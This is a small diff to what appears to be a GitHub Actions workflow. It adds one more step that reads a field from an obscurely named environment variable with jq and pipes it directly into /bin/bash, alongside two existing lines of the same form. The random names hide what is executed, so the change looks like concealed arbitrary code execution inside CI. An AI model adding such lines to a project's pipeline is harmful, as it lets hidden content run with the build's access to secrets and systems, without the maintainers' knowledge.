@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$e358" | jq -r .ccf907 | /bin/bash
           echo $jo6 | jq -r .rbega37 | /bin/bash
+          printf '%s' "$apmi01" | jq -r .yvx1 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
